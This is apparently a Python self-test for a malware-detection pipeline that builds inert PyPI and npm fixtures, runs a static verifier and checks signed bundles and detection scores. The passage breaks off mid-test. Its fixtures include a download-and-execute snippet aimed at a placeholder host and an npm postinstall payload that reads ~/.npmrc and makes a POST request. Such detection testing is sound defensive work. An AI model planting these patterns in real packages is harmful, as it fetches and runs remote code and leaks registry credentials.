#!/usr/bin/env python3
"""End-to-end inert tests for static verifier bundle assembly and strict scoring."""

from __future__ import annotations

import base64
import copy
import hashlib
import io
import json
import os
import shutil
import subprocess
import tarfile
import tempfile
import zipfile
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[1]
ASSEMBLER = ROOT / "scripts" / "whoathere-static-projection-bundle-assembler.py"
BRIDGE = ROOT / "scripts" / "whoathere-signed-projection-registry-bridge.py"
PUBLISHER = ROOT / "scripts" / "whoathere-run-result-v2-publisher.py"
EVALUATOR = ROOT / "scripts" / "whoathere-actual-malware-evaluation.py"
SCHEMA = ROOT / "scripts" / "whoathere-static-download-execute-projection-schema-v1.json"
SENSITIVE_EXFIL_SCHEMA = (
    ROOT
    / "scripts"
    / "whoathere-static-sensitive-file-exfiltration-projection-schema-v1.json"
)
COMBINED_SCHEMA = ROOT / "scripts" / "whoathere-static-projection-schema-set-v1.json"
MANIFEST = ROOT / "whoathere" / "Cargo.toml"
DEFAULT_VERIFIER = ROOT / "whoathere" / "target" / "debug" / "whoathere-static-projection"

EXECUTION_PROFILE_SHA256 = "sha256:" + "8" * 64
RUN_SPECS = [
    ("inert-static-wheel-a", "wheel-static-v1"),
    ("inert-static-wheel-b", "wheel-static-v1"),
    ("inert-static-wheel-c", "wheel-static-v1"),
]
PYTHON_DOWNLOAD_EXECUTE = b'''import subprocess
import urllib.request

def fetch_and_launch():
    destination = "/tmp/inert-second-stage"
    with urllib.request.urlopen("https://example.invalid/second-stage") as response:
        with open(destination, "wb") as output:
            output.write(response.read())
    subprocess.Popen([destination])

fetch_and_launch()
'''
NPM_SENSITIVE_READ = b'''const fs = require('node:fs');
const config = fs.readFileSync(process.env.HOME + '/.npmrc');
console.log(config.length);
'''
NPM_SENSITIVE_EXFIL_CAPABILITY = NPM_SENSITIVE_READ + b'''const https = require('node:https');
https.request({method: 'POST'});
'''


def require(condition: bool, message: str) -> None:
    if not condition:
        raise AssertionError(message)


def digest(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def canonical(value: Any) -> bytes:
    return (
        json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
        + b"\n"
    )


def pretty(value: Any) -> bytes:
    return json.dumps(value, indent=2, sort_keys=True, ensure_ascii=False).encode("utf-8") + b"\n"


def write_json(path: Path, value: Any) -> None:
    path.write_bytes(pretty(value))


def build_verifier() -> Path:
    configured = os.environ.get("WHOATHERE_STATIC_PROJECTION_BIN")
    if configured:
        verifier = Path(configured).expanduser().absolute()
        require(verifier.is_file(), "configured static verifier is unavailable")
        return verifier
    process = subprocess.run(
        [
            "cargo",
            "build",
            "--manifest-path",
            str(MANIFEST),
            "-p",
            "whoathere-runner",
            "--bin",
            "whoathere-static-projection",
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    require(process.returncode == 0, process.stdout + process.stderr)
    require(DEFAULT_VERIFIER.is_file(), "built static verifier is unavailable")
    return DEFAULT_VERIFIER


def key_pair(root: Path, label: str = "verifier") -> tuple[Path, Path]:
    openssl = shutil.which("openssl")
    require(openssl is not None, "openssl is required")
    private = root / f"{label}-private.pem"
    public = root / f"{label}-public.pem"
    subprocess.run(
        [openssl, "genpkey", "-algorithm", "ED25519", "-out", str(private)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
    )
    subprocess.run(
        [openssl, "pkey", "-in", str(private), "-pubout", "-out", str(public)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
    )
    return private, public


def wheel_record_hash(value: bytes) -> str:
    encoded = base64.urlsafe_b64encode(hashlib.sha256(value).digest()).rstrip(b"=").decode("ascii")
    return "sha256=" + encoded


def write_member(archive: zipfile.ZipFile, path: str, value: bytes) -> None:
    info = zipfile.ZipInfo(path, date_time=(1980, 1, 1, 0, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = 0o100644 << 16
    archive.writestr(info, value)


def inert_wheel(path: Path, package_name: str, marker: str) -> None:
    normalized = package_name.replace("-", "_")
    dist_info = f"{normalized}-1.0.0.dist-info"
    payload = PYTHON_DOWNLOAD_EXECUTE + f"\n# fixture {marker}\n".encode("utf-8")
    members = [
        (
            f"{dist_info}/METADATA",
            f"Metadata-Version: 2.3\nName: {package_name}\nVersion: 1.0.0\n".encode(),
        ),
        (
            f"{dist_info}/WHEEL",
            b"Wheel-Version: 1.0\nGenerator: whoathere-selftest\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
        ),
        (f"{normalized}/__init__.py", b"from . import client\n"),
        (f"{normalized}/client.py", payload),
    ]
    record_path = f"{dist_info}/RECORD"
    record = "".join(
        f"{member_path},{wheel_record_hash(value)},{len(value)}\n"
        for member_path, value in members
    ) + f"{record_path},,\n"
    with zipfile.ZipFile(path, "w") as archive:
        for member_path, value in members:
            write_member(archive, member_path, value)
        write_member(archive, record_path, record.encode("utf-8"))


def inert_npm_tgz(path: Path, package_name: str, payload: bytes) -> None:
    members = {
        "package/package.json": json.dumps(
            {
                "name": package_name,
                "version": "1.0.0",
                "main": "index.js",
                "scripts": {"postinstall": "node index.js"},
            },
            sort_keys=True,
            separators=(",", ":"),
        ).encode("utf-8"),
        "package/index.js": payload,
    }
    with tarfile.open(path, "w:gz", format=tarfile.PAX_FORMAT) as archive:
        for member_path, value in sorted(members.items()):
            info = tarfile.TarInfo(member_path)
            info.size = len(value)
            info.mode = 0o644
            info.mtime = 0
            archive.addfile(info, io.BytesIO(value))


def corpus_row(sample_id: str, artifact_path: Path) -> dict[str, Any]:
    return {
        "schema_version": "whoathere.actual_malware.corpus.v1",
        "sample_id": sample_id,
        "sample_kind": "malware",
        "ecosystem": "pypi",
        "package_name": sample_id,
        "package_version": "1.0.0",
        "artifact_filename": artifact_path.name,
        "artifact_sha256": digest(artifact_path.read_bytes()),
        "artifact_size_bytes": artifact_path.stat().st_size,
        "source_type": "lab_benign_fixture",
        "source_reference": "synthetic:static-bundle-assembler",
        "disclosure_date": "2026-07-01",
        "expected_result": "malicious",
        "trigger_phases": ["python_import"],
        "behavior_labels": ["second_stage_fetch"],
        "network_policy": "sinkhole_only",
        "live_c2_allowed": False,
        "second_stage_live_fetch_allowed": False,
        "sync_back_allowed": False,
        "acquisition": {
            "case_id": "static-bundle-assembler-selftest",
            "allowed_test_purpose": "hermetic inert fixture selftest",
            "acquired_at_utc": "2026-07-15T00:00:00Z",
            "collector": "selftest",
            "reviewer": "selftest",
            "authorization": "synthetic-only",
            "custody_store": "temporary-directory",
            "retention_rule": "destroy-on-close",
            "source_confidence": "synthetic",
        },
        "approvals": {
            "two_person_approval": True,
            "legal_provider_approval": True,
            "security_lab_owner": "selftest",
            "whoathere_evaluation_owner": "selftest",
        },
    }


def npm_corpus_row(
    sample_id: str, artifact_path: Path, *, expected_result: str
) -> dict[str, Any]:
    value = corpus_row(sample_id, artifact_path)
    value.update(
        {
            "ecosystem": "npm",
            "artifact_filename": artifact_path.name,
            "expected_result": expected_result,
            "trigger_phases": ["npm_lifecycle"],
            "behavior_labels": (
                ["sensitive_file_exfiltration"] if expected_result == "malicious" else []
            ),
        }
    )
    return value


def manifest(
    *,
    corpus_path: Path,
    artifacts: dict[str, Path],
    verifier: Path,
    public_key: Path,
    schema: Path = SCHEMA,
    run_specs: list[tuple[str, str]] = RUN_SPECS,
) -> dict[str, Any]:
    return {
        "schema": "whoathere.actual_malware.evaluation_manifest.v2",
        "evaluation_id": "inert-static-assembly",
        "evaluation_class": "known_regression",
        "created_at_utc": "2026-07-14T23:59:00Z",
        "corpus_sha256": digest(corpus_path.read_bytes()),
        "identities": {
            "runtime_sha256": "sha256:" + "1" * 64,
            "prompt_set_sha256": "sha256:" + "2" * 64,
            "observation_schema_sha256": "sha256:" + "3" * 64,
            "provider_adapter_sha256": "sha256:" + "4" * 64,
            "policy_sha256": "sha256:" + "5" * 64,
            "scorer_id": "whoathere-actual-malware-evaluation.py:score-results-v2",
        },
        "verified_evidence_registry": {
            "registry_id": "inert-static-assembly-registry",
            "verifier_id": "whoathere-static-projection-v1",
            "verifier_public_key_sha256": digest(public_key.read_bytes()),
            "verifier_executable_sha256": digest(verifier.read_bytes()),
            "projection_schema_sha256": digest(schema.read_bytes()),
        },
        "evaluation_window": {
            "starts_at_utc": "2026-07-15T00:00:00Z",
            "ends_at_utc": "2026-07-15T01:00:00Z",
            "maximum_result_to_registry_seconds": 600,
        },
        "thresholds": {
            "malicious_behavior_detection_rate_min": 1.0,
            "benign_false_malicious_rate_max": 0.0,
            "benign_friction_rate_max": 0.0,
            "required_run_completion_rate_min": 1.0,
            "safety_pass_rate_min": 1.0,
        },
        "cohorts": [
            {
                "cohort_id": "inert-malicious",
                "expected_result": "malicious",
                "description": "inert exact static assembly fixtures",
            }
        ],
        "required_runs": [
            {
                "sample_id": sample_id,
                "profile_id": profile_id,
                "cohort_id": "inert-malicious",
                "family_id": "inert-static-family-" + sample_id[-1],
                "campaign_id": "inert-static-campaign-" + sample_id[-1],
                "artifact_sha256": digest(artifacts[sample_id].read_bytes()),
                "execution_profile_sha256": EXECUTION_PROFILE_SHA256,
                "ecosystem": "pypi",
                "expected_result": "malicious",
                "required_behavior_labels": ["second_stage_fetch"],
                "required_modalities": ["deterministic"],
                "require_complete": True,
            }
            for sample_id, profile_id in run_specs
        ],
    }


def npm_manifest(
    *,
    corpus_path: Path,
    artifacts: dict[str, Path],
    verifier: Path,
    public_key: Path,
) -> dict[str, Any]:
    value = manifest(
        corpus_path=corpus_path,
        artifacts={},
        verifier=verifier,
        public_key=public_key,
        schema=SENSITIVE_EXFIL_SCHEMA,
        run_specs=[],
    )
    value["evaluation_id"] = "inert-static-sensitive-exfil-assembly"
    value["verified_evidence_registry"]["registry_id"] = (
        "inert-static-sensitive-exfil-assembly-registry"
    )
    value["required_runs"] = [
        {
            "sample_id": sample_id,
            "profile_id": "npm-static-sensitive-exfil-v1",
            "cohort_id": "inert-malicious",
            "family_id": "inert-static-sensitive-exfil-family",
            "campaign_id": "inert-static-sensitive-exfil-campaign",
            "artifact_sha256": digest(artifact.read_bytes()),
            "execution_profile_sha256": EXECUTION_PROFILE_SHA256,
            "ecosystem": "npm",
            "expected_result": "malicious",
            "required_behavior_labels": ["sensitive_file_exfiltration"],
            "required_modalities": ["deterministic"],
            "require_complete": True,
        }
        for sample_id, artifact in sorted(artifacts.items())
    ]
    value["cohorts"] = [
        {
            "cohort_id": "inert-malicious",
            "expected_result": "malicious",
            "description": "inert npm sensitive-file exfiltration capability fixture",
        }
    ]
    return value


def combined_manifest(
    *,
    corpus_path: Path,
    wheel_sample_id: str,
    wheel_artifact: Path,
    npm_sample_id: str,
    npm_artifact: Path,
    verifier: Path,
    public_key: Path,
) -> dict[str, Any]:
    value = manifest(
        corpus_path=corpus_path,
        artifacts={},
        verifier=verifier,
        public_key=public_key,
        schema=COMBINED_SCHEMA,
        run_specs=[],
    )
    value["evaluation_id"] = "inert-static-combined-policy-assembly"
    value["verified_evidence_registry"]["registry_id"] = (
        "inert-static-combined-policy-assembly-registry"
    )
    value["required_runs"] = [
        {
            "sample_id": wheel_sample_id,
            "profile_id": "wheel-static-v1",
            "cohort_id": "inert-malicious",
            "family_id": "inert-static-combined-wheel-family",
            "campaign_id": "inert-static-combined-wheel-campaign",
            "artifact_sha256": digest(wheel_artifact.read_bytes()),
            "execution_profile_sha256": EXECUTION_PROFILE_SHA256,
            "ecosystem": "pypi",
            "expected_result": "malicious",
            "required_behavior_labels": ["second_stage_fetch"],
            "required_modalities": ["deterministic"],
            "require_complete": True,
        },
        {
            "sample_id": npm_sample_id,
            "profile_id": "npm-static-sensitive-exfil-v1",
            "cohort_id": "inert-malicious",
            "family_id": "inert-static-combined-npm-family",
            "campaign_id": "inert-static-combined-npm-campaign",
            "artifact_sha256": digest(npm_artifact.read_bytes()),
            "execution_profile_sha256": EXECUTION_PROFILE_SHA256,
            "ecosystem": "npm",
            "expected_result": "malicious",
            "required_behavior_labels": ["sensitive_file_exfiltration"],
            "required_modalities": ["deterministic"],
            "require_complete": True,
        },
    ]
    value["cohorts"] = [
        {
            "cohort_id": "inert-malicious",
            "expected_result": "malicious",
            "description": "inert combined static-policy fixtures",
        }
    ]
    return value


def run_inputs(run_id: str, *, deterministic_state: str = "incomplete") -> dict[str, Any]:
    require(deterministic_state in {"complete", "incomplete"}, "invalid deterministic state")
    return {
        "schema": "whoathere.static_projection_bundle_run_fact_inputs.v1",
        "created_at_utc": "2026-07-15T00:01:00Z",
        "verified_at_utc": "2026-07-15T00:02:00Z",
        "run_id": run_id,
        "completion_state": deterministic_state,
        "completion_gap_codes": (
            [] if deterministic_state == "complete" else ["deterministic_coverage_incomplete"]
        ),
        "coverage": [
            {
                "modality": "deterministic",
                "state": deterministic_state,
                "evidence_binding": "static_verifier_source_receipt",
            }
        ],
        "safety": {
            "network_policy": "sinkhole_only",
            "host_package_execution_applied": False,
            "sync_back_applied": False,
            "live_c2_contacted": False,
            "live_second_stage_fetched": False,
            "restricted_material_leak": False,
            "teardown_verified": True,
        },
    }


def assemble(
    *,
    directory: Path,
    manifest_path: Path,
    manifest_sha256: str,
    sample_id: str,
    profile_id: str,
    artifact: Path,
    verifier: Path,
    public_key: Path,
    private_key: Path,
    run_input_path: Path,
    schema: Path = SCHEMA,
) -> tuple[subprocess.CompletedProcess[str], dict[str, Path]]:
    outputs = {
        "metadata": directory / "static-verifier-metadata.json",
        "bundle": directory / "verified-projection-bundle.json",
        "signature": directory / "verified-projection-bundle.sig",
        "result": directory / "run-result.json",
    }
    process = subprocess.run(
        [
            "python3",
            "-B",
            str(ASSEMBLER),
            "--evaluation-manifest",
            str(manifest_path),
            "--expected-evaluation-manifest-sha256",
            manifest_sha256,
            "--sample-id",
            sample_id,
            "--profile-id",
            profile_id,
            "--artifact",
            str(artifact),
            "--artifact-acquired-at",
            "2026-07-15T00:00:30Z",
            "--verifier-id",
            "whoathere-static-projection-v1",
            "--verifier-executable",
            str(verifier),
            "--projection-schema",
            str(schema),
            "--verifier-public-key",
            str(public_key),
            "--verifier-signing-private-key",
            str(private_key),
            "--run-fact-inputs",
            str(run_input_path),
            "--out-static-verifier-metadata",
            str(outputs["metadata"]),
            "--out-bundle",
            str(outputs["bundle"]),
            "--out-signature",
            str(outputs["signature"]),
            "--out-run-result",
            str(outputs["result"]),
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    return process, outputs


def invoke_verifier(
    *, artifact: Path, verifier: Path, projection_kind: str
) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(
        [
            str(verifier),
            "--artifact",
            str(artifact),
            "--ecosystem",
            "npm",
            "--acquired-at",
            "2026-07-15T00:00:30Z",
            "--expected-artifact-sha256",
            digest(artifact.read_bytes()),
            "--projection-kind",
            projection_kind,
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )


def bridge(
    *,
    directory: Path,
    manifest_path: Path,
    manifest_sha256: str,
    run_index: Path,
    public_key: Path,
    private_key: Path,
) -> tuple[subprocess.CompletedProcess[str], Path, Path]:
    registry = directory / "verified-evidence-registry.json"
    signature = directory / "verified-evidence-registry.sig"
    process = subprocess.run(
        [
            "python3",
            "-B",
            str(BRIDGE),
            "--evaluation-manifest",
            str(manifest_path),
            "--expected-evaluation-manifest-sha256",
            manifest_sha256,
            "--run-index",
            str(run_index),
            "--verifier-public-key",
            str(public_key),
            "--registry-signing-private-key",
            str(private_key),
            "--out-registry",
            str(registry),
            "--out-signature",
            str(signature),
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    return process, registry, signature


def score(
    *,
    directory: Path,
    corpus: Path,
    manifest_path: Path,
    results: list[Path],
    registry: Path,
    public_key: Path,
    registry_signature: Path,
) -> subprocess.CompletedProcess[str]:
    results_path = directory / "run-results.jsonl"
    results_path.write_text(
        "".join(
            json.dumps(json.loads(path.read_text(encoding="utf-8")), sort_keys=True) + "\n"
            for path in results
        ),
        encoding="utf-8",
    )
    return subprocess.run(
        [
            "python3",
            "-B",
            str(EVALUATOR),
            "score-results",
            "--corpus",
            str(corpus),
            "--results",
            str(results_path),
            "--evaluation-manifest",
            str(manifest_path),
            "--verified-evidence-registry",
            str(registry),
            "--verified-evidence-public-key",
            str(public_key),
            "--verified-evidence-signature",
            str(registry_signature),
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )


def case_directory(root: Path, name: str) -> Path:
    path = root / name
    path.mkdir()
    return path


def main() -> int:
    checks = 0
    verifier = build_verifier()
    with tempfile.TemporaryDirectory(prefix="whoathere-static-bundle-assembler-selftest-") as raw_tmp:
        root = Path(raw_tmp)
        private_key, public_key = key_pair(root)
        artifacts: dict[str, Path] = {}
        for index, (sample_id, _) in enumerate(RUN_SPECS):
            artifact = root / f"{sample_id.replace('-', '_')}-1.0.0-py3-none-any.whl"
            inert_wheel(artifact, sample_id, str(index))
            artifacts[sample_id] = artifact

        corpus_path = root / "corpus.jsonl"
        corpus_path.write_text(
            "".join(
                json.dumps(corpus_row(sample_id, artifacts[sample_id]), sort_keys=True) + "\n"
                for sample_id, _ in RUN_SPECS
            ),
            encoding="utf-8",
        )
        manifest_value = manifest(
            corpus_path=corpus_path,
            artifacts=artifacts,
            verifier=verifier,
            public_key=public_key,
        )
        manifest_path = root / "evaluation-manifest.json"
        write_json(manifest_path, manifest_value)
        manifest_sha256 = digest(manifest_path.read_bytes())

        assembled: dict[str, dict[str, Path]] = {}
        for sample_id, profile_id in RUN_SPECS:
            directory = case_directory(root, "assembled-" + sample_id)
            run_input_path = directory / "run-fact-inputs.json"
            run_input_path.write_bytes(canonical(run_inputs("run-" + sample_id)))
            process, outputs = assemble(
                directory=directory,
                manifest_path=manifest_path,
                manifest_sha256=manifest_sha256,
                sample_id=sample_id,
                profile_id=profile_id,
                artifact=artifacts[sample_id],
                verifier=verifier,
                public_key=public_key,
                private_key=private_key,
                run_input_path=run_input_path,
            )
            require(process.returncode == 0, process.stdout + process.stderr)
            assembled[sample_id] = outputs
            metadata = json.loads(outputs["metadata"].read_text(encoding="utf-8"))
            bundle = json.loads(outputs["bundle"].read_text(encoding="utf-8"))
            require(metadata["projection_count"] == len(bundle["projections"]) > 0, str(metadata))
            require(bundle["projections"] == metadata["projections"], "assembler changed verifier projections")
            require(bundle["run_fact"]["artifact_sha256"] == digest(artifacts[sample_id].read_bytes()), str(bundle))
        checks += 1

        bridge_dir = case_directory(root, "bridge")
        run_index = bridge_dir / "run-index.json"
        run_index.write_bytes(
            canonical(
                {
                    "schema": "whoathere.actual_malware.signed_projection_run_index.v1",
                    "evaluation_manifest_sha256": manifest_sha256,
                    "runs": [
                        {
                            "sample_id": sample_id,
                            "profile_id": profile_id,
                            "verified_projection_bundle": str(assembled[sample_id]["bundle"]),
                            "verified_projection_signature": str(assembled[sample_id]["signature"]),
                            "run_result": str(assembled[sample_id]["result"]),
                        }
                        for sample_id, profile_id in RUN_SPECS
                    ],
                }
            )
        )
        bridge_process, registry, registry_signature = bridge(
            directory=bridge_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            run_index=run_index,
            public_key=public_key,
            private_key=private_key,
        )
        require(bridge_process.returncode == 0, bridge_process.stdout + bridge_process.stderr)
        checks += 1

        score_process = score(
            directory=bridge_dir,
            corpus=corpus_path,
            manifest_path=manifest_path,
            results=[assembled[sample_id]["result"] for sample_id, _ in RUN_SPECS],
            registry=registry,
            public_key=public_key,
            registry_signature=registry_signature,
        )
        require(score_process.returncode == 20, score_process.stdout + score_process.stderr)
        report = json.loads(score_process.stdout)
        require(report["passed"] is False and report["validation_errors"] == [], str(report))
        require(report["rates"]["malicious_behavior_detection"] == 1.0, str(report))
        require(report["rates"]["required_run_completion"] == 0.0, str(report))
        checks += 1

        npm_positive_id = "inert-static-npm-sensitive-exfil-positive"
        npm_benign_id = "inert-static-npm-sensitive-exfil-benign"
        npm_artifacts = {
            npm_positive_id: root / "inert-static-npm-sensitive-exfil-positive-1.0.0.tgz",
            npm_benign_id: root / "inert-static-npm-sensitive-exfil-benign-1.0.0.tgz",
        }
        inert_npm_tgz(
            npm_artifacts[npm_positive_id],
            "inert-static-npm-sensitive-exfil-positive",
            NPM_SENSITIVE_EXFIL_CAPABILITY,
        )
        inert_npm_tgz(
            npm_artifacts[npm_benign_id],
            "inert-static-npm-sensitive-exfil-benign",
            NPM_SENSITIVE_READ,
        )
        npm_corpus_path = root / "npm-corpus.jsonl"
        npm_corpus_path.write_text(
            json.dumps(
                npm_corpus_row(
                    npm_positive_id,
                    npm_artifacts[npm_positive_id],
                    expected_result="malicious",
                ),
                sort_keys=True,
            )
            + "\n",
            encoding="utf-8",
        )
        npm_manifest_value = npm_manifest(
            corpus_path=npm_corpus_path,
            artifacts={npm_positive_id: npm_artifacts[npm_positive_id]},
            verifier=verifier,
            public_key=public_key,
        )
        npm_manifest_path = root / "npm-evaluation-manifest.json"
        write_json(npm_manifest_path, npm_manifest_value)
        npm_manifest_sha256 = digest(npm_manifest_path.read_bytes())

        projection_kind = "static_sensitive_file_exfiltration_capability"
        direct_positive = invoke_verifier(
            artifact=npm_artifacts[npm_positive_id],
            verifier=verifier,
            projection_kind=projection_kind,
        )
        require(direct_positive.returncode == 0, direct_positive.stderr.decode("utf-8"))
        direct_positive_metadata = json.loads(direct_positive.stdout)
        require(
            direct_positive_metadata["schema"]
            == "whoathere.static_sensitive_file_exfiltration_projection_metadata.v1",
            str(direct_positive_metadata),
        )
        require(
            direct_positive_metadata["projection_count"] > 0
            and all(
                projection["kind"] == projection_kind
                for projection in direct_positive_metadata["projections"]
            ),
            str(direct_positive_metadata),
        )
        deterministic_state = (
            "complete"
            if direct_positive_metadata["verification_summary"]["deterministic_analysis_status"]
            == "findings"
            else "incomplete"
        )

        npm_positive_dir = case_directory(root, "assembled-npm-sensitive-exfil-positive")
        npm_positive_inputs = npm_positive_dir / "run-fact-inputs.json"
        npm_positive_inputs.write_bytes(
            canonical(
                run_inputs(
                    "run-inert-static-npm-sensitive-exfil-positive",
                    deterministic_state=deterministic_state,
                )
            )
        )
        npm_positive_process, npm_positive_outputs = assemble(
            directory=npm_positive_dir,
            manifest_path=npm_manifest_path,
            manifest_sha256=npm_manifest_sha256,
            sample_id=npm_positive_id,
            profile_id="npm-static-sensitive-exfil-v1",
            artifact=npm_artifacts[npm_positive_id],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=npm_positive_inputs,
            schema=SENSITIVE_EXFIL_SCHEMA,
        )
        require(
            npm_positive_process.returncode == 0,
            npm_positive_process.stdout + npm_positive_process.stderr,
        )
        npm_positive_result = json.loads(
            npm_positive_outputs["result"].read_text(encoding="utf-8")
        )
        require(
            {
                (row["evidence_type"], row["behavior_label"], row["modality"])
                for row in npm_positive_result["observations"]
            }
            == {
                (
                    "sensitive_file_exfiltration_capability",
                    "sensitive_file_exfiltration",
                    "deterministic",
                )
            },
            str(npm_positive_result),
        )
        require(
            npm_positive_result["safety"]
            == {
                "network_policy": "sinkhole_only",
                "host_package_execution_applied": False,
                "sync_back_applied": False,
                "live_c2_contacted": False,
                "live_second_stage_fetched": False,
                "restricted_material_leak": False,
                "teardown_verified": True,
            }
            and npm_positive_result["admission"]
            == {"artifact_release_applied": False, "manual_review_required": True},
            str(npm_positive_result),
        )
        checks += 1

        npm_bridge_dir = case_directory(root, "npm-sensitive-exfil-bridge")
        npm_run_index = npm_bridge_dir / "run-index.json"
        npm_run_index.write_bytes(
            canonical(
                {
                    "schema": "whoathere.actual_malware.signed_projection_run_index.v1",
                    "evaluation_manifest_sha256": npm_manifest_sha256,
                    "runs": [
                        {
                            "sample_id": npm_positive_id,
                            "profile_id": "npm-static-sensitive-exfil-v1",
                            "verified_projection_bundle": str(
                                npm_positive_outputs["bundle"]
                            ),
                            "verified_projection_signature": str(
                                npm_positive_outputs["signature"]
                            ),
                            "run_result": str(npm_positive_outputs["result"]),
                        }
                    ],
                }
            )
        )
        npm_bridge_process, npm_registry, npm_registry_signature = bridge(
            directory=npm_bridge_dir,
            manifest_path=npm_manifest_path,
            manifest_sha256=npm_manifest_sha256,
            run_index=npm_run_index,
            public_key=public_key,
            private_key=private_key,
        )
        require(
            npm_bridge_process.returncode == 0,
            npm_bridge_process.stdout + npm_bridge_process.stderr,
        )
        npm_score_process = score(
            directory=npm_bridge_dir,
            corpus=npm_corpus_path,
            manifest_path=npm_manifest_path,
            results=[npm_positive_outputs["result"]],
            registry=npm_registry,
            public_key=public_key,
            registry_signature=npm_registry_signature,
        )
        require(
            npm_score_process.returncode == 20,
            npm_score_process.stdout + npm_score_process.stderr,
        )
        npm_report = json.loads(npm_score_process.stdout)
        require(
            npm_report["passed"] is False
            and npm_report["validation_errors"] == [],
            str(npm_report),
        )
        require(
            npm_report["rates"]["malicious_behavior_detection"] == 1.0,
            str(npm_report),
        )
        require(
            npm_report["results"][0]["matched_behavior_labels"]
            == ["sensitive_file_exfiltration"],
            str(npm_report),
        )
        checks += 1

        combined_wheel_id, _ = RUN_SPECS[0]
        combined_corpus_path = root / "combined-policy-corpus.jsonl"
        combined_corpus_path.write_text(
            "".join(
                [
                    json.dumps(
                        corpus_row(
                            combined_wheel_id, artifacts[combined_wheel_id]
                        ),
                        sort_keys=True,
                    )
                    + "\n",
                    json.dumps(
                        npm_corpus_row(
                            npm_positive_id,
                            npm_artifacts[npm_positive_id],
                            expected_result="malicious",
                        ),
                        sort_keys=True,
                    )
                    + "\n",
                ]
            ),
            encoding="utf-8",
        )
        combined_manifest_value = combined_manifest(
            corpus_path=combined_corpus_path,
            wheel_sample_id=combined_wheel_id,
            wheel_artifact=artifacts[combined_wheel_id],
            npm_sample_id=npm_positive_id,
            npm_artifact=npm_artifacts[npm_positive_id],
            verifier=verifier,
            public_key=public_key,
        )
        combined_manifest_path = root / "combined-policy-evaluation-manifest.json"
        write_json(combined_manifest_path, combined_manifest_value)
        combined_manifest_sha256 = digest(combined_manifest_path.read_bytes())

        combined_cases = [
            (
                "combined-policy-wheel",
                combined_wheel_id,
                "wheel-static-v1",
                artifacts[combined_wheel_id],
                "incomplete",
                "static_download_execute_capability",
            ),
            (
                "combined-policy-npm",
                npm_positive_id,
                "npm-static-sensitive-exfil-v1",
                npm_artifacts[npm_positive_id],
                deterministic_state,
                "static_sensitive_file_exfiltration_capability",
            ),
        ]
        combined_outputs: dict[str, dict[str, Path]] = {}
        for (
            case_name,
            sample_id,
            profile_id,
            artifact,
            case_deterministic_state,
            expected_projection_kind,
        ) in combined_cases:
            directory = case_directory(root, case_name)
            case_inputs = directory / "run-inputs.json"
            case_inputs.write_bytes(
                canonical(
                    run_inputs(
                        "run-" + case_name,
                        deterministic_state=case_deterministic_state,
                    )
                )
            )
            process, outputs = assemble(
                directory=directory,
                manifest_path=combined_manifest_path,
                manifest_sha256=combined_manifest_sha256,
                sample_id=sample_id,
                profile_id=profile_id,
                artifact=artifact,
                verifier=verifier,
                public_key=public_key,
                private_key=private_key,
                run_input_path=case_inputs,
                schema=COMBINED_SCHEMA,
            )
            require(process.returncode == 0, process.stdout + process.stderr)
            bundle = json.loads(outputs["bundle"].read_text(encoding="utf-8"))
            require(
                bundle["projection_schema_sha256"] == digest(COMBINED_SCHEMA.read_bytes())
                and {
                    projection["kind"] for projection in bundle["projections"]
                }
                == {expected_projection_kind},
                str(bundle),
            )
            combined_outputs[sample_id] = outputs
        require(
            combined_outputs[combined_wheel_id]["bundle"].is_file()
            and combined_outputs[npm_positive_id]["bundle"].is_file(),
            "combined schema did not publish both policy rows",
        )
        checks += 1

        for name, behavior_labels, expected_reason in [
            (
                "combined-policy-zero-label",
                [],
                "projection_schema_set_behavior_label_not_unique",
            ),
            (
                "combined-policy-multiple-labels",
                ["second_stage_fetch", "sensitive_file_exfiltration"],
                "projection_schema_set_behavior_label_not_unique",
            ),
            (
                "combined-policy-unsupported-label",
                ["unsupported_static_behavior"],
                "projection_schema_set_policy_not_unique",
            ),
        ]:
            invalid_manifest = copy.deepcopy(combined_manifest_value)
            invalid_manifest["required_runs"][0]["required_behavior_labels"] = behavior_labels
            invalid_manifest_path = root / f"{name}-manifest.json"
            write_json(invalid_manifest_path, invalid_manifest)
            invalid_manifest_sha256 = digest(invalid_manifest_path.read_bytes())
            directory = case_directory(root, name)
            case_inputs = directory / "run-inputs.json"
            case_inputs.write_bytes(canonical(run_inputs("run-" + name)))
            process, _ = assemble(
                directory=directory,
                manifest_path=invalid_manifest_path,
                manifest_sha256=invalid_manifest_sha256,
                sample_id=combined_wheel_id,
                profile_id="wheel-static-v1",
                artifact=artifacts[combined_wheel_id],
                verifier=verifier,
                public_key=public_key,
                private_key=private_key,
                run_input_path=case_inputs,
                schema=COMBINED_SCHEMA,
            )
            require(
                process.returncode == 20 and expected_reason in process.stderr,
                process.stderr,
            )
            checks += 1

        modality_manifest = copy.deepcopy(combined_manifest_value)
        modality_manifest["required_runs"][0]["required_modalities"] = ["dynamic"]
        modality_manifest_path = root / "combined-policy-wrong-modality-manifest.json"
        write_json(modality_manifest_path, modality_manifest)
        modality_manifest_sha256 = digest(modality_manifest_path.read_bytes())
        modality_dir = case_directory(root, "combined-policy-wrong-modality")
        modality_inputs = modality_dir / "run-inputs.json"
        modality_inputs.write_bytes(canonical(run_inputs("run-combined-policy-wrong-modality")))
        modality_process, _ = assemble(
            directory=modality_dir,
            manifest_path=modality_manifest_path,
            manifest_sha256=modality_manifest_sha256,
